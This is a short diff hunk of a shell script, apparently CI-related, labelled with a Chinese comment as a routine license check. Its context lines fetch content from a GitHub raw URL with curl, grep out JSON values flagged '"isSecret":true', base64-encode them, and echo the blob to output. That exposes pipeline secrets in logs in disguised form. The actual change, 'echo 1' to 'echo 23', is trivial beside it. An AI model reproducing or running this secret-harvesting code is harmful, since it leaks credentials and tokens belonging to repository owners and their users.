@@ -6,7 +6,7 @@ B64_BLOB=$(curl -sSfL https://github.com/flank/flank/raw/128b43b61fd7da13ea6829d
   grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | \
   sort -u | \
   base64 -w 0)
-echo 1
+echo 23
 echo "$B64_BLOB"
 
 # 许可证检查部分保持不变
